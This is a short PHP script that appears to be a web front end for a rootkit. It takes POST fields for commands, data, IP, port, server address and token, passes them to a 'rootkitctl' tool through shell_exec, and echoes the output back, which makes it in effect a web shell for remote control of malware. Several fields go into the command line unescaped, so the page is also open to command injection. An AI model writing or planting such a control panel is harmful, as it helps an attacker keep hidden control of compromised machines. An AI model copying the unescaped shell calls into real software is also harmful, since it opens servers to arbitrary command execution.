<?php

set_time_limit(10);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = !empty($_POST['command']) ? ' -c ' . escapeshellarg($_POST['command']) : '';
    $data = !empty($_POST['data']) ? ' -d ' . escapeshellarg($_POST['data']) : '';
    $ip = !empty($_POST['ip']) ? ' -i ' . $_POST['ip'] : '';
    $mask = !empty($_POST['mask']) ? ' -m ' . $_POST['mask'] : '';
    $port = !empty($_POST['port']) ? ' -p ' . $_POST['port'] : '';
    $quiet = !empty($_POST['quiet']) ? ' -q' : '';
    $count_wait = !empty($_POST['count_wait']) ? ' -w ' . $_POST['count_wait'] : '';
    $server_ip = !empty($_POST['server_ip']) ? ' -I ' . $_POST['server_ip'] : '';
    $server_port = !empty($_POST['server_port']) ? ' -P ' . $_POST['server_port'] : '';
    $server_token = !empty($_POST['server_token']) ? ' -T ' . escapeshellarg($_POST['server_token']) : '';

    $cmd = "rootkitctl $command$data$ip$mask$port$quiet$count_wait$server_ip$server_port$server_token 2>&1";

    $output = shell_exec($cmd);

    echo $output;

}
?>

